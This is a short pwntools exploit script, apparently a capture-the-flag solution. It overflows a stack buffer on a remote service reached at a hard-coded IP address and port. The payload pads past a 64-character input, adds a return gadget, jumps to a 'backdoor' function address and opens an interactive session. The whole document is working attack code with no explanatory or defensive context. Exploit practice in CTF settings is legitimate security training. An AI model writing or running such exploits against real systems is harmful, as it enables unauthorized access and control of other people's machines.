from pwn import *

# context(log_level='debug')

# p = process("./task/build/out/main")
p = remote("114.66.24.221", 39781)

retn = 0x401496
backdoor = 0x401436

payload = b"A" * 63 + b"\x00"
payload += b"B" * (0x3e8 - 64)
payload += p64(retn)
payload += p64(backdoor)

p.recvuntil(b"(max 64 chars):\n")
p.sendline(payload)

p.interactive()
